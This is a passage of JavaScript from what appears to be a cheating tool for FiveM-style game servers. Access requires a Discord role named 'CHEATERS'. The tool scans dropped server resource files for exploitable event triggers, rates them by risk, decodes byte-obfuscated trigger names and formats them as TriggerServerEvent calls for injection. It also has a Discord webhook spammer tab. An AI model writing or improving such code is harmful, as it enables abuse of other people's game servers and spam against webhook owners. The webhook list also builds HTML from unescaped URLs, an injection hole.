            const guilds = await guildResponse.json();
            const isInGuild = guilds.some(guild => guild.id === DISCORD_CONFIG.GUILD_ID);
            
            if (isInGuild) {

                let hasRequiredRole = false;
                let roleCheckFailed = false;
                try {
                    const memberResponse = await fetch(`https://discord.com/api/users/@me/guilds/${DISCORD_CONFIG.GUILD_ID}/member`, {
                        headers: {
                            'Authorization': `Bearer ${accessToken}`
                        }
                    });
                    
                    if (memberResponse.ok) {
                        const member = await memberResponse.json();
                        console.log('Member data:', member); // Debug log
                        if (member && member.roles && Array.isArray(member.roles)) {
                            console.log('User roles:', member.roles); // Debug log
                            console.log('Required role ID:', DISCORD_CONFIG.REQUIRED_ROLE_ID); // Debug log
                            hasRequiredRole = member.roles.includes(DISCORD_CONFIG.REQUIRED_ROLE_ID);
                            console.log('Has required role:', hasRequiredRole); // Debug log
                        } else {
                            console.error('Member data invalid or missing roles:', member);
                            roleCheckFailed = true;
                        }
                    } else {
                        console.error('Failed to get member data. Status:', memberResponse.status, memberResponse.statusText);
                        const errorText = await memberResponse.text();
                        console.error('Error response:', errorText);
                        roleCheckFailed = true;
                    }
                } catch (roleError) {
                    console.error('Error checking user role:', roleError);
                    roleCheckFailed = true;
                }

                if (roleCheckFailed || !hasRequiredRole) {
                    console.error('Access denied - Role check failed or user does not have required role');
                    console.error('Role check failed:', roleCheckFailed);
                    console.error('Has required role:', hasRequiredRole);

                    showNotification('You do not have the required role to use this tool.', 'error');

                    localStorage.removeItem('discordAuth');
                    discordAuth.isAuthenticated = false;
                    discordAuth.user = null;
                    discordAuth.accessToken = null;

                    const authModal = document.getElementById('discord-auth-modal');
                    if (authModal) {
                        const modalContent = authModal.querySelector('.discord-auth-content');
                        if (modalContent) {
                            modalContent.innerHTML = `
                                <div style="text-align: center; padding: 20px;">
                                    <h3 style="color: #fff; margin-bottom: 15px;">Access Denied</h3>
                                    <p style="color: #c7c7cf; margin-bottom: 20px;">
                                        You must have the required role <strong style="color: #e3b341;">CHEATERS</strong> in our Discord server to use this tool.
                                    </p>
                                    <p style="color: #9a9aa8; font-size: 14px; margin-bottom: 20px;">
                                        Required Role ID: ${DISCORD_CONFIG.REQUIRED_ROLE_ID}
                                    </p>
                                    <button id="refresh-after-role-btn" class="discord-login-btn" style="margin-top: 10px;">
                                        <i class="fas fa-sync-alt"></i>
                                        Refresh Page
                                    </button>
                                </div>
                            `;
                            
                            const refreshBtn = document.getElementById('refresh-after-role-btn');
                            if (refreshBtn) {
                                refreshBtn.onclick = () => {
                                    window.location.reload();
                                };
                            }
                        }
                    }
                    
                    showDiscordAuthModal();
                    return;
                }

                console.log('Access granted - User has required role');

                const userResponse = await fetch('https://discord.com/api/users/@me', {
                    headers: {
                        'Authorization': `Bearer ${accessToken}`
                    }
                });
                
                if (userResponse.ok) {
                    const user = await userResponse.json();
                    const authData = JSON.parse(localStorage.getItem('discordAuth'));
                    
                    discordAuth.isAuthenticated = true;
                    discordAuth.user = user;
                    discordAuth.accessToken = accessToken;
                    
                    initializeAppAfterAuth();
                } else {
                    showDiscordAuthModal();
                }
            } else {

                showNotification('You must join our Discord server to use this tool. Opening invite...', 'error');

                localStorage.removeItem('discordAuth');

                window.open('https://discord.gg/webhooked', '_blank');

                const authModal = document.getElementById('discord-auth-modal');
                if (authModal) {
                    const modalContent = authModal.querySelector('.discord-auth-content');
                    if (modalContent) {
                        modalContent.innerHTML = `
                            <div style="text-align: center; padding: 20px;">
                                <h3 style="color: #fff; margin-bottom: 15px;">Join Our Discord Server</h3>
                                <p style="color: #c7c7cf; margin-bottom: 20px;">
                                    You must join our Discord server to use this tool.<br>
                                    An invite link has been opened in a new tab.
                                </p>
                                <p style="color: #9a9aa8; font-size: 14px; margin-bottom: 20px;">
                                    After joining, refresh this page and login again.
                                </p>
                                <button id="refresh-after-join-btn" class="discord-login-btn" style="margin-top: 10px;">
                                    <i class="fas fa-sync-alt"></i>
                                    Refresh Page
                                </button>
                            </div>
                        `;
                        
                        const refreshBtn = document.getElementById('refresh-after-join-btn');
                        if (refreshBtn) {
                            refreshBtn.onclick = () => {
                                window.location.reload();
                            };
                        }
                    }
                }
                
                showDiscordAuthModal();
            }
        } else {
            showDiscordAuthModal();
        }
    } catch (error) {
        console.error('Error verifying guild membership:', error);
        showDiscordAuthModal();
    }
}

document.addEventListener('DOMContentLoaded', function() {
    initPasswordGate();
});

// ============================================================================
// 35xw · Password gate (client-side access lock)
// ============================================================================
function initPasswordGate() {
    const modal = document.getElementById('password-modal');
    const frame = document.getElementById('gate-frame');
    let unlocked = false;

    // No gate markup present -> just boot the app.
    if (!modal || !frame) {
        try { initializeAppAfterAuth(); } catch (e) { console.error(e); }
        return;
    }

    const mainApp = document.getElementById('main-app-container');
    if (mainApp) mainApp.style.display = 'none';

    // The gate lives in an iframe (gate.html) that renders the chrome-logo shatter
    // experience + password bar. It validates the password (0607) itself and posts
    // { type: '35xw-unlock' } to us on success. We then fade it out and boot the app.
    function unlock() {
        if (unlocked) return;
        unlocked = true;
        window.__appUnlocked = true;
        modal.classList.add('closing');
        setTimeout(() => {
            if (modal) modal.style.display = 'none';
            if (frame) frame.src = 'about:blank';   // free the heavy WebGL/React gate
            try { initializeAppAfterAuth(); } catch (e) { console.error(e); }
        }, 560);
    }

    window.addEventListener('message', (e) => {
        const d = e && e.data;
        if (d && (d === '35xw-unlock' || d.type === '35xw-unlock')) unlock();
    });
}

// ============================================================================
// 35xw · Global drag & drop (drop a folder or files anywhere on the page)
// ============================================================================
function initGlobalDragDrop() {
    if (window.__dragDropInit) return;
    window.__dragDropInit = true;

    const overlay = document.getElementById('global-drop-overlay');
    let depth = 0;

    const hasFiles = (e) => {
        const t = e.dataTransfer && e.dataTransfer.types;
        if (!t) return false;
        return Array.prototype.indexOf.call(t, 'Files') !== -1 || (t.contains && t.contains('Files'));
    };
    const show = () => { if (overlay) overlay.classList.add('active'); };
    const hide = () => { if (overlay) overlay.classList.remove('active'); depth = 0; };

    window.addEventListener('dragenter', (e) => {
        if (!hasFiles(e)) return;
        e.preventDefault();
        depth++;
        show();
    });
    window.addEventListener('dragover', (e) => {
        if (!hasFiles(e)) return;
        e.preventDefault();
        try { e.dataTransfer.dropEffect = 'copy'; } catch (err) {}
    });
    window.addEventListener('dragleave', (e) => {
        if (!hasFiles(e)) return;
        depth--;
        if (depth <= 0) hide();
    });
    window.addEventListener('drop', async (e) => {
        if (!hasFiles(e)) return;
        e.preventDefault();
        hide();
        try {
            const files = await collectDroppedFiles(e.dataTransfer);
            if (!files.length) {
                showNotification('No readable files found in that drop', 'warning');
                return;
            }
            const topFolder = (files[0].webkitRelativePath || files[0].name).split('/')[0] || 'dropped';
            appState.serverDirectory = topFolder;
            appState.selectedFiles = files;
            if (typeof serverDirectoryInput !== 'undefined' && serverDirectoryInput) serverDirectoryInput.value = topFolder;
            const sdi = document.getElementById('server-directory-input');
            if (sdi) sdi.value = topFolder;
            updateResourceExplorer(files);
            showNotification(`Loaded ${files.length} file(s) from “${topFolder}” — run Deep Scan to analyze`, 'success');
        } catch (err) {
            console.error('Drop error:', err);
            showNotification('Could not read the dropped items', 'error');
        }
    });
}

// Recursively walk a DataTransfer (supports dropped folders) into real File objects
async function collectDroppedFiles(dataTransfer) {
    const items = dataTransfer.items;
    const supportsEntries = items && items.length && typeof items[0].webkitGetAsEntry === 'function';

    const tagPath = (file, path) => {
        try {
            Object.defineProperty(file, 'webkitRelativePath', { value: path, configurable: true, writable: true });
        } catch (e) {
            try { file.webkitRelativePath = path; } catch (e2) {}
        }
        return file;
    };

    const flatFallback = () => Array.from(dataTransfer.files || []).map(f => tagPath(f, `dropped/${f.name}`));

    if (!supportsEntries) {
        return flatFallback();
    }

    const entries = [];
    for (let i = 0; i < items.length; i++) {
        const entry = items[i].webkitGetAsEntry && items[i].webkitGetAsEntry();
        if (entry) entries.push(entry);
    }

    if (!entries.length) {
        // Entries API present but yielded nothing (e.g. some browsers / synthetic drops)
        return flatFallback();
    }

    const out = [];
    const readEntry = (entry) => new Promise((resolve) => {
        if (entry.isFile) {
            entry.file((file) => {
                const rel = (entry.fullPath || `/${file.name}`).replace(/^\//, '');
                out.push(tagPath(file, rel.indexOf('/') === -1 ? `dropped/${rel}` : rel));
                resolve();
            }, () => resolve());
        } else if (entry.isDirectory) {
            const reader = entry.createReader();
            const batches = [];
            const readBatch = () => {
                reader.readEntries((results) => {
                    if (!results.length) {
                        Promise.all(batches.map(readEntry)).then(resolve);
                        return;
                    }
                    results.forEach(r => batches.push(r));
                    readBatch(); // keep reading until empty (readEntries returns in chunks)
                }, () => resolve());
            };
            readBatch();
        } else {
            resolve();
        }
    });

    await Promise.all(entries.map(readEntry));
    return out.length ? out : flatFallback();
}

// ============================================================================
// 35xw · Mail zone: open a custom provider from the input
// ============================================================================
function initMailCustomForm() {
    const form = document.getElementById('mail-custom-form');
    const input = document.getElementById('mail-custom-input');
    if (!form || !input) return;
    form.addEventListener('submit', (e) => {
        e.preventDefault();
        let v = input.value.trim();
        if (!v) return;
        const known = {
            gmail: 'https://mail.google.com/', google: 'https://mail.google.com/',
            outlook: 'https://outlook.live.com/', hotmail: 'https://outlook.live.com/',
            proton: 'https://mail.proton.me/', protonmail: 'https://mail.proton.me/',
            yahoo: 'https://mail.yahoo.com/', icloud: 'https://www.icloud.com/mail/',
            apple: 'https://www.icloud.com/mail/', yandex: 'https://mail.yandex.com/',
            gmx: 'https://www.gmx.com/', tuta: 'https://app.tuta.com/', tutanota: 'https://app.tuta.com/',
            zoho: 'https://mail.zoho.com/', aol: 'https://mail.aol.com/'
        };
        const key = v.toLowerCase().replace(/\s|mail|\.com|\.|@/g, '');
        let url;
        if (known[key]) url = known[key];
        else if (/^https?:\/\//i.test(v)) url = v;
        else if (/\./.test(v)) url = 'https://' + v.replace(/^\/+/, '');
        else url = 'https://duckduckgo.com/?q=' + encodeURIComponent(v + ' webmail login');
        window.open(url, '_blank', 'noopener,noreferrer');
    });
}


function initializeApp() {

    tabButtons.forEach(button => {
        button.addEventListener('click', () => {
            const tabName = button.getAttribute('data-tab');
            switchTab(tabName);
        });
    });

    // Header quick-nav pills (2FA / TempMail) that live up by the 35xw logo.
    document.querySelectorAll('.stat-nav').forEach(pill => {
        pill.addEventListener('click', () => switchTab(pill.getAttribute('data-goto')));
    });

    actionButtons.forEach(button => {
        button.addEventListener('click', () => {
            actionButtons.forEach(btn => btn.classList.remove('active'));
            button.classList.add('active');
            handleActionButton(button.textContent.trim());
        });
    });

    searchInput.addEventListener('input', handleSearch);

    const resourceSearchInput = document.getElementById('resource-search-input');
    if (resourceSearchInput) {
        resourceSearchInput.addEventListener('input', handleResourceSearch);
    }


    const triggerFilterButtons = document.querySelectorAll('.trigger-filter-btn:not([data-filter-target="known-triggers"])');
    triggerFilterButtons.forEach(button => {
        button.addEventListener('click', () => {
            const filter = button.getAttribute('data-filter');
            const filterType = button.getAttribute('data-filter-type');
            
            if (filterType === 'type') {
                appState.triggerFilter = filter;

                document.querySelectorAll('.trigger-filter-btn[data-filter-type="type"]:not([data-filter-target="known-triggers"])').forEach(btn => btn.classList.remove('active'));
            } else if (filterType === 'risk') {
                appState.riskFilter = filter;

                document.querySelectorAll('.trigger-filter-btn[data-filter-type="risk"]:not([data-filter-target="known-triggers"])').forEach(btn => btn.classList.remove('active'));
            }
            
            button.classList.add('active');

            applyTriggerFilter();
        });
    });

    const itemsFilterButtons = document.querySelectorAll('.items-filter-btn');
    itemsFilterButtons.forEach(button => {
        button.addEventListener('click', () => {
            const filter = button.getAttribute('data-filter');
            appState.itemsFilter = filter;

            itemsFilterButtons.forEach(btn => btn.classList.remove('active'));
            button.classList.add('active');

            applyItemsFilter();
        });
    });

    const knownTriggerFilterButtons = document.querySelectorAll('.trigger-filter-btn[data-filter-target="known-triggers"]');
    knownTriggerFilterButtons.forEach(button => {
        button.addEventListener('click', () => {
            const filter = button.getAttribute('data-filter');
            const filterType = button.getAttribute('data-filter-type');
            
            if (filterType === 'type') {
                appState.knownTriggerTypeFilter = filter;

                document.querySelectorAll('.trigger-filter-btn[data-filter-target="known-triggers"][data-filter-type="type"]').forEach(btn => btn.classList.remove('active'));
            } else if (filterType === 'risk') {
                appState.knownTriggerRiskFilter = filter;

                document.querySelectorAll('.trigger-filter-btn[data-filter-target="known-triggers"][data-filter-type="risk"]').forEach(btn => btn.classList.remove('active'));
            }
            
            button.classList.add('active');

            applyKnownTriggersFilter();
        });
    });

    if (browseDirectoryBtn) {
    browseDirectoryBtn.addEventListener('click', browseServerDirectory);
    }
    if (browseBtn) {
    browseBtn.addEventListener('click', browseServerDirectory);
    }
    if (deepScanBtn) {
    deepScanBtn.addEventListener('click', performDeepScan);
    }
    if (clearResultsBtn) {
    clearResultsBtn.addEventListener('click', clearResults);
    }
    
    if (loadKnownTriggersBtn) {
        loadKnownTriggersBtn.addEventListener('click', () => {
            const inputSection = document.getElementById('known-triggers-input-section');
            if (inputSection) {
                inputSection.style.display = inputSection.style.display === 'none' ? 'block' : 'none';
            }
        });
    }

    initializeFormHandlers();
    
}

function updateSpammerSelectedWebhooks() {
    try {
        const container = document.getElementById('spammer-webhooks-list');
        if (!container) return;

        container.innerHTML = '';

        const allWebhooks = [...new Set([...appState.manualWebhooks, ...appState.selectedWebhooks])];
        
        if (allWebhooks.length === 0) {
            container.innerHTML = '<p style="color: #9a9aa8; text-align: center; font-size: 12px; padding: 20px;">No webhooks available. Add webhooks using the input above or select from the Webhooks tab.</p>';
            return;
        }
        
        allWebhooks.forEach((url, index) => {
            const isManual = appState.manualWebhooks.includes(url);
            const isSelected = appState.selectedWebhooks.includes(url);
            
            const webhookItem = document.createElement('div');
            webhookItem.className = `webhook-item ${isSelected ? 'selected' : ''}`;
            webhookItem.innerHTML = `
                <input type="checkbox" class="webhook-checkbox spammer-checkbox" data-url="${url}" ${isSelected ? 'checked' : ''} onchange="toggleWebhookSelection('${url}')" title="${isSelected ? 'Deselect' : 'Select'}">
                <span class="webhook-url">${url}</span>
                <div style="display: flex; gap: 5px;">
                    <button class="remove-btn" onclick="removeWebhook('${url}')" title="Remove">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
            `;
            
            container.appendChild(webhookItem);
        });
    } catch (error) {
        console.error('Error updating spammer webhooks list:', error);
    }
}

function switchTab(tabName) {

    tabButtons.forEach(btn => {
        btn.classList.remove('active');
        if (btn.getAttribute('data-tab') === tabName) {
            btn.classList.add('active');
        }
    });

    document.querySelectorAll('.stat-nav').forEach(pill => {
        pill.classList.toggle('active', pill.getAttribute('data-goto') === tabName);
    });

    tabContents.forEach(content => {
        content.classList.remove('active');
        if (content.id === `${tabName}-content`) {
            content.classList.add('active');
        }
    });

    appState.currentTab = tabName;

    const triggerFilters = document.getElementById('trigger-filters');
    if (triggerFilters) {
        if (tabName === 'triggers') {
            triggerFilters.style.display = 'flex';
        } else {
            triggerFilters.style.display = 'none';
        }
    }

    const itemsFilters = document.getElementById('items-filters');
    if (itemsFilters) {
        if (tabName === 'items') {
            itemsFilters.style.display = 'flex';
        } else {
            itemsFilters.style.display = 'none';
        }
    }

    const knownTriggersFilters = document.getElementById('known-triggers-filters');
    if (knownTriggersFilters) {
        if (tabName === 'known-triggers') {
            knownTriggersFilters.style.display = 'flex';
        } else {
            knownTriggersFilters.style.display = 'none';
        }
    }

    if (tabName === 'spammer') {
        updateSpammerSelectedWebhooks();
        setupSpammerEventListeners();
    }

    if (tabName === 'editor') {
        setupEditorEventListeners();
    }

    if (tabName === 'deob') {
        setupDeobEventListeners();
    }

    if (tabName === 'triggers') {
        applyTriggerFilter();
    }

    if (tabName === 'items') {
        applyItemsFilter();
    }

    if (tabName === 'known-triggers') {
        applyKnownTriggersFilter();
    }

    // Hide the scan/search action bar on informational tabs where it does not apply.
    const actionsPanel = document.querySelector('.actions-panel');
    if (actionsPanel) {
        const infoTabs = ['twofa', 'credits'];
        actionsPanel.style.display = infoTabs.includes(tabName) ? 'none' : '';
    }

    updateStats();
}

function setupEditorEventListeners() {
    try {
        console.log('Setting up Editor event listeners...');

        const loopTriggerBtn = document.getElementById('loop-trigger-btn');
        const keybindTriggerBtn = document.getElementById('keybind-trigger-btn');

        if (loopTriggerBtn) {
            loopTriggerBtn.replaceWith(loopTriggerBtn.cloneNode(true));
            const newLoopBtn = document.getElementById('loop-trigger-btn');
            newLoopBtn.addEventListener('click', () => {
                console.log('Loop trigger button clicked!');
                handleLoopTrigger();
            });
            console.log('Loop trigger button event listener added');
        } else {
            console.error('Loop trigger button not found!');
        }

        if (keybindTriggerBtn) {
            keybindTriggerBtn.replaceWith(keybindTriggerBtn.cloneNode(true));
            const newKeybindBtn = document.getElementById('keybind-trigger-btn');
            newKeybindBtn.addEventListener('click', () => {
                console.log('Keybind trigger button clicked!');
                handleKeybindTrigger();
            });
            console.log('Keybind trigger button event listener added');
        } else {
            console.error('Keybind trigger button not found!');
        }

        const oxCallbackBtn = document.getElementById('ox-callback-btn');
        if (oxCallbackBtn) {
            oxCallbackBtn.replaceWith(oxCallbackBtn.cloneNode(true));
            const newOxCallbackBtn = document.getElementById('ox-callback-btn');
            newOxCallbackBtn.addEventListener('click', () => {
                console.log('Ox Callback button clicked!');
                convertToOxCallback();
            });
            console.log('Ox Callback button event listener added');
        } else {
            console.error('Ox Callback button not found!');
        }

        const convertToTriggerBtn = document.getElementById('convert-to-trigger-btn');
        const convertFromTriggerBtn = document.getElementById('convert-from-trigger-btn');
        const copyToEditorBtn = document.getElementById('copy-to-editor-btn');
        const keyserFormatCheckbox = document.getElementById('keyser-format-checkbox');
        const standardConverter = document.getElementById('standard-converter');
        const keyserConverter = document.getElementById('keyser-converter');
        const convertToKeyserBtn = document.getElementById('convert-to-keyser-btn');
        const copyKeyserToEditorBtn = document.getElementById('copy-keyser-to-editor-btn');
        
        if (convertToTriggerBtn) {
            convertToTriggerBtn.addEventListener('click', () => {
                convertToTriggerFormat();
            });
        }
        
        if (convertFromTriggerBtn) {
            convertFromTriggerBtn.addEventListener('click', () => {
                convertFromTriggerFormat();
            });
        }
        
        if (copyToEditorBtn) {
            copyToEditorBtn.addEventListener('click', () => {
                const triggerOutput = document.getElementById('converter-trigger-output')?.value.trim() || '';
                const editorTextarea = document.getElementById('editor-trigger-text');
                
                if (!triggerOutput) {
                    showNotification('No trigger format to copy', 'error');
                    return;
                }
                
                if (editorTextarea) {
                    editorTextarea.value = triggerOutput;
                    editorTextarea.focus();
                    showNotification('Copied to editor', 'success');
                }
            });
        }

        if (keyserFormatCheckbox && standardConverter && keyserConverter) {
            keyserFormatCheckbox.addEventListener('change', () => {
                if (keyserFormatCheckbox.checked) {
                    standardConverter.style.display = 'none';
                    keyserConverter.style.display = 'grid';
                } else {
                    standardConverter.style.display = 'grid';
                    keyserConverter.style.display = 'none';
                }
            });
        }

        const convertKeyserToTriggerBtn = document.getElementById('convert-keyser-to-trigger-btn');
        const convertTriggerToKeyserBtn = document.getElementById('convert-trigger-to-keyser-btn');
        
        if (convertKeyserToTriggerBtn) {
            convertKeyserToTriggerBtn.addEventListener('click', () => {
                convertKeyserToTriggerFormat();
            });
        }
        
        if (convertTriggerToKeyserBtn) {
            convertTriggerToKeyserBtn.addEventListener('click', () => {
                convertTriggerToKeyserFormat();
            });
        }
        
        if (copyKeyserToEditorBtn) {
            copyKeyserToEditorBtn.addEventListener('click', () => {
                const triggerOutput = document.getElementById('keyser-trigger-output')?.value.trim() || '';
                const editorTextarea = document.getElementById('editor-trigger-text');
                
                if (!triggerOutput) {
                    showNotification('No trigger format to copy', 'error');
                    return;
                }
                
                if (editorTextarea) {
                    editorTextarea.value = triggerOutput;
                    editorTextarea.focus();
                    showNotification('Copied to editor', 'success');
                }
            });
        }
        
        console.log('Editor event listeners setup complete');
        
    } catch (error) {
        console.error('Error setting up Editor event listeners:', error);
    }
}

function setupDeobEventListeners() {
    try {
        console.log('Setting up Deobfuscator event listeners...');

        const deobTriggerBtn = document.getElementById('deob-trigger-btn');
        const clearDeobBtn = document.getElementById('clear-deob-btn');
        const deobSampleBtn = document.getElementById('deob-sample-btn');

        if (deobTriggerBtn) {
            deobTriggerBtn.replaceWith(deobTriggerBtn.cloneNode(true));
            const newBtn = document.getElementById('deob-trigger-btn');
            newBtn.addEventListener('click', handleDeobfuscateBytes);
        }

        if (clearDeobBtn) {
            clearDeobBtn.replaceWith(clearDeobBtn.cloneNode(true));
            const newClearBtn = document.getElementById('clear-deob-btn');
            newClearBtn.addEventListener('click', clearDeobfuscatorFields);
        }

        if (deobSampleBtn) {
            deobSampleBtn.replaceWith(deobSampleBtn.cloneNode(true));
            const newSampleBtn = document.getElementById('deob-sample-btn');
            newSampleBtn.addEventListener('click', () => fillSampleBytes(true));
        }

        console.log('Deobfuscator event listeners setup complete');
    } catch (error) {
        console.error('Error setting up Deobfuscator event listeners:', error);
    }
}

function convertToTriggerFormat() {
    try {
        const eventName = document.getElementById('converter-event-name')?.value.trim() || '';
        const payload = document.getElementById('converter-payload')?.value.trim() || '';
        const outputField = document.getElementById('converter-trigger-output');
        
        if (!eventName) {
            showNotification('Please enter an event name', 'error');
            return;
        }

        let triggerFormat = `TriggerServerEvent('${eventName}'`;
        
        if (payload) {

            const payloadParts = payload.split(',').map(p => p.trim()).filter(p => p);
            if (payloadParts.length > 0) {
                triggerFormat += ', ' + payloadParts.join(', ');
            }
        }
        
        triggerFormat += ')';
        
        if (outputField) {
            outputField.value = triggerFormat;
            showNotification('Converted to TriggerServerEvent format', 'success');
        }
    } catch (error) {
        console.error('Error converting to trigger format:', error);
        showNotification('Error converting to trigger format', 'error');
    }
}

function convertFromTriggerFormat() {
    try {
        const triggerInput = document.getElementById('converter-trigger-output')?.value.trim() || '';
        const eventNameField = document.getElementById('converter-event-name');
        const payloadField = document.getElementById('converter-payload');
        
        if (!triggerInput) {
            showNotification('Please enter a trigger format', 'error');
            return;
        }

        const triggerPattern = /Trigger(?:Server|Client)?Event\s*\(\s*["']([^"']+)["']\s*(?:,\s*(.+))?\)/;
        const match = triggerInput.match(triggerPattern);
        
        if (!match) {
            showNotification('Invalid trigger format. Expected: TriggerServerEvent(\'event:name\', payload)', 'error');
            return;
        }
        
        const eventName = match[1];
        const payload = match[2] ? match[2].trim() : '';
        
        if (eventNameField) {
            eventNameField.value = eventName;
        }
        
        if (payloadField) {
            payloadField.value = payload;
        }
        
        showNotification('Extracted event name and payload', 'success');
    } catch (error) {
        console.error('Error converting from trigger format:', error);
        showNotification('Error converting from trigger format', 'error');
    }
}

const DEOB_SAMPLE_BYTES = "84,114,105,103,103,101,114,69,118,101,110,116"; // "TriggerEvent"

function handleDeobfuscateBytes() {
    try {
        const inputEl = document.getElementById('deob-trigger-bytes');
        const outputEl = document.getElementById('deob-trigger-output');
        const summaryEl = document.getElementById('deob-trigger-summary');

        if (!inputEl) return;

        const raw = inputEl.value || '';
        const cleaned = raw.replace(/[\[\]\(\)\n\r]/g, ' ');
        const parts = cleaned.split(/[^0-9]+/).filter(Boolean);

        if (parts.length === 0) {
            showNotification('Please paste a numeric byte array', 'error');
            return;
        }

        const bytes = parts
            .map(n => parseInt(n, 10))
            .filter(n => Number.isFinite(n))
            .map(n => Math.max(0, Math.min(255, n)));

        if (bytes.length === 0) {
            showNotification('No valid byte values found', 'error');
            return;
        }

        let decoded = '';
        for (const b of bytes) {
            decoded += String.fromCharCode(b);
        }

        if (outputEl) {
            outputEl.value = decoded;
        }

        if (summaryEl) {
            const noun = bytes.length === 1 ? 'byte' : 'bytes';
            summaryEl.textContent = `Decoded ${bytes.length} ${noun} → "${decoded}"`;
        }

        showNotification('Deobfuscated trigger bytes', 'success');
    } catch (error) {
        console.error('Error deobfuscating trigger bytes:', error);
        showNotification('Error deobfuscating trigger bytes', 'error');
    }
}

function convertToOxCallback() {
    try {
        const triggerText = document.getElementById('editor-trigger-text')?.value.trim() || '';
        
        if (!triggerText) {
            showNotification('Please paste a trigger in the editor first', 'error');
            return;
        }

        const triggerPattern = /Trigger(?:Server|Client)?Event\s*\(\s*["']([^"']+)["']\s*(?:,\s*(.+))?\)/;
        const match = triggerText.match(triggerPattern);
        
        if (!match) {
            showNotification('Invalid trigger format. Expected: TriggerServerEvent(\'event:name\', payload)', 'error');
            return;
        }

        const eventName = match[1];
        const payload = match[2] ? match[2].trim() : '';
        const isServerEvent = triggerText.includes('TriggerServerEvent');
        
        let clientCode = '';
        let serverCode = '';
        
        if (isServerEvent) {
            clientCode = `local result = lib.callback.await('${eventName}'`;
            if (payload) {
                const payloadParts = payload.split(',').map(p => p.trim()).filter(p => p);
                if (payloadParts.length > 0) {
                    clientCode += `, ${payloadParts.join(', ')}`;
                }
            }
            clientCode += ')';
            
            const serverParams = payload ? `, ${payload}` : '';
            serverCode = `lib.callback.register('${eventName}', function(source, cb${serverParams})
    -- Your code here
    -- source = player server ID
    -- cb = callback function to return data to client
${payload ? `    -- Parameters: ${payload}` : ''}
    
    local result = true -- or return your data
    cb(result)
end)`;
        } else {
            clientCode = `lib.callback.await('${eventName}'`;
            if (payload) {
                const payloadParts = payload.split(',').map(p => p.trim()).filter(p => p);
                if (payloadParts.length > 0) {
                    clientCode += `, ${payloadParts.join(', ')}`;
                }
            }
            clientCode += ')';
            
            const serverParams = payload ? `, ${payload}` : '';
            serverCode = `lib.callback.register('${eventName}', function(source, cb${serverParams})
    -- Your code here
    -- source = player server ID
    -- cb = callback function to return data to client
${payload ? `    -- Parameters: ${payload}` : ''}
    
    local result = true -- or return your data
    cb(result)
end)`;
        }
        
        const fullCode = `-- CLIENT SIDE (use this in your client script)
-- Note: lib.callback.await waits for server response
${clientCode}

-- SERVER SIDE (use this in your server script)
-- Note: Must register callback before client can use it
${serverCode}`;
        
        document.getElementById('editor-trigger-text').value = fullCode;
        showNotification('Converted to Ox Callback format! Client uses lib.callback.await, server uses lib.callback.register', 'success');
    } catch (error) {
        console.error('Error converting to Ox Callback:', error);
        showNotification('Error converting to Ox Callback format', 'error');
    }
}

function clearDeobfuscatorFields() {
    const inputEl = document.getElementById('deob-trigger-bytes');
    const outputEl = document.getElementById('deob-trigger-output');
    const summaryEl = document.getElementById('deob-trigger-summary');

    if (inputEl) inputEl.value = '';
    if (outputEl) outputEl.value = '';
    if (summaryEl) summaryEl.textContent = 'Waiting for input…';
}

function fillSampleBytes(autoDecode = false) {
    const inputEl = document.getElementById('deob-trigger-bytes');
    if (!inputEl) return;
    inputEl.value = DEOB_SAMPLE_BYTES;
    if (autoDecode) {
        handleDeobfuscateBytes();
    }
}

function convertKeyserToTriggerFormat() {
    try {
        const keyserInput = document.getElementById('keyser-format-input')?.value.trim() || '';
        const triggerOutputField = document.getElementById('keyser-trigger-output');
        
        if (!keyserInput) {
            showNotification('Please enter a Keyser format', 'error');
            return;
        }





        
        const parts = keyserInput.split('|').map(p => p.trim());
        
        if (parts.length < 1 || parts.length > 2) {
            showNotification('Invalid Keyser format. Expected: eventName | [payload]', 'error');
            return;
        }
        
        const eventName = parts[0].trim();
        let payload = parts[1] ? parts[1].trim() : '';

        let triggerFormat = `TriggerServerEvent('${eventName}'`;
        
        if (payload) {

            if (payload.startsWith('[') && payload.endsWith(']')) {
                payload = payload.substring(1, payload.length - 1).trim();
            }
            
            if (payload) {

                const payloadParts = payload.split(',').map(p => p.trim()).filter(p => p);
                
                if (payloadParts.length > 0) {

                    const formattedPayload = payloadParts.map(p => {

                        if ((p.startsWith('"') && p.endsWith('"')) || (p.startsWith("'") && p.endsWith("'"))) {
                            return p;
                        }

                        if (!isNaN(p) && !isNaN(parseFloat(p))) {
                            return p;
                        }

                        return `"${p}"`;
                    }).join(', ');
                    
                    triggerFormat += `, ${formattedPayload}`;
                }
            }
        }
        
        triggerFormat += ')';
        
        if (triggerOutputField) {
            triggerOutputField.value = triggerFormat;
            showNotification('Converted to TriggerServerEvent format', 'success');
        }
    } catch (error) {
        console.error('Error converting Keyser to trigger format:', error);
        showNotification('Error converting Keyser to trigger format', 'error');
    }
}

function convertTriggerToKeyserFormat() {
    try {
        const triggerInput = document.getElementById('keyser-trigger-output')?.value.trim() || '';
        const keyserOutputField = document.getElementById('keyser-format-input');
        
        if (!triggerInput) {
            showNotification('Please enter a TriggerServerEvent format', 'error');
            return;
        }

        const triggerPattern = /Trigger(?:Server|Client)?Event\s*\(\s*["']([^"']+)["']\s*(?:,\s*(.+))?\)/;
        const match = triggerInput.match(triggerPattern);
        
        if (!match) {
            showNotification('Invalid trigger format. Expected: TriggerServerEvent(\'event:name\', payload)', 'error');
            return;
        }
        
        const eventName = match[1];
        const payload = match[2] ? match[2].trim() : '';

        let keyserFormat = eventName;
        
        if (payload) {

            const payloadParts = payload.split(',').map(p => p.trim()).filter(p => p);
            
            if (payloadParts.length > 0) {


                const formattedPayload = payloadParts.map((p, index) => {

                    if ((p.startsWith('"') && p.endsWith('"')) || (p.startsWith("'") && p.endsWith("'"))) {
                        return p;
                    }

                    if (payloadParts.length === 1) {
                        return `"${p}"`;
                    }

                    if (!isNaN(p) && !isNaN(parseFloat(p))) {
                        return p;
                    }

                    return `"${p}"`;
                }).join(',');
                
                keyserFormat += ` | [${formattedPayload}]`;
            }
        }
        
        if (keyserOutputField) {
            keyserOutputField.value = keyserFormat;
            showNotification('Converted to Keyser format', 'success');
        }
    } catch (error) {
        console.error('Error converting trigger to Keyser format:', error);
        showNotification('Error converting trigger to Keyser format', 'error');
    }
}

function initializeFormHandlers() {

    const sendBtn = document.querySelector('.send-btn');
    const clearBtn = document.querySelector('.clear-btn');
    const startSpamBtn = document.querySelector('.start-spam-btn');
    const stopSpamBtn = document.querySelector('.stop-spam-btn');
    const selectAllBtn = document.querySelector('.select-all-btn');
    const clearSelectionBtn = document.querySelector('.clear-selection-btn');
